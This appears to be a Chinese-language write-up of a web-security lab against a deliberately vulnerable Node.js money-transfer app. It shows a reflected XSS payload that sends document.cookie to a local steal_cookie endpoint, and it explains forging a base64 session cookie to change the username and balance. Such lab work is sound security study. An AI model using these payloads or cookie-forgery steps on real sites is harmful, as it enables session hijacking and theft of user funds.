# CyberSecurity

## a.txt
输入未知的user name xxx，显示出`xxx does not exist`
注意到`router.js`中相关代码如下：
```javascript
    if(result) { // if user exists
      render(req, res, next, 'profile/view', 'View Profile', false, result);
    }
    else { // user does not exist
      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
    }
```
可以看到，当用户不存在时，会将`req.query.username`直接拼接到返回的html中，这里存在XSS漏洞。
考虑在此注入一段js代码，如下：
```html
<p hidden>
    <script>
        var x = new XMLHttpRequest();
        x.open("GET", "http://localhost:3000/steal_cookie?cookie="+(document.cookie));
        x.send()
    </script>
```
这段代码会向`http://localhost:3000/steal_cookie`发送一个GET请求，其中包含当前页面的cookie信息。

## b.html
见`b.pdf`

## c.txt
在`router.js`中，有如下代码：
```javascript
  if(receiver) { // if user exists
    const amount = parseInt(req.body.quantity);
    if(Number.isNaN(amount) || amount > req.session.account.bitbars || amount < 1) {
      render(req, res, next, 'transfer/form', 'Transfer Bitbars', 'Invalid transfer amount!', {receiver:null, amount:null});
      return;
    }

    req.session.account.bitbars -= amount;
    query = `UPDATE Users SET bitbars = "${req.session.account.bitbars}" WHERE username == "${req.session.account.username}";`;
    await db.exec(query);
    const receiverNewBal = receiver.bitbars + amount;
    query = `UPDATE Users SET bitbars = "${receiverNewBal}" WHERE username == "${receiver.username}";`;
    await db.exec(query);
    render(req, res, next, 'transfer/success', 'Transfer Complete', false, {receiver, amount});
  }
```
注意到转账更新是直接将`session cookie`中的相关数据更新到数据库中，考虑直接对`cookie`做改动。

登录`user1`，在控制台中查看`document.cookie`，得到
```
"session=eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6InVzZXIxIiwiaGFzaGVkUGFzc3dvcmQiOiI4MTQ2ZmYzM2U4MTVlMWEwOGVhZTJiNDczYmYyY2NhMTU5NTgyZTQzNGM1MjUyNGMzMzI1ZjA2ZThjMmI4MGQ5Iiwic2FsdCI6IjEzMzciLCJwcm9maWxlIjoiIiwiYml0YmFycyI6MjAwfX0="
```

使用base64解码：
`{"loggedIn":true,"account":{"username":"user1","hashedPassword":"8146ff33e815e1a08eae2b473bf2cca159582e434c52524c3325f06e8c2b80d9","salt":"1337","profile":"","bitbars":200}}`

直接对解码后的cookie修改`username`和`bitbars`字段，再将其base64编码，得到新的cookie即可

## d.txt
和`c.txt`的原理相同，获取`cookie`后，修改`bitbars`字段即可
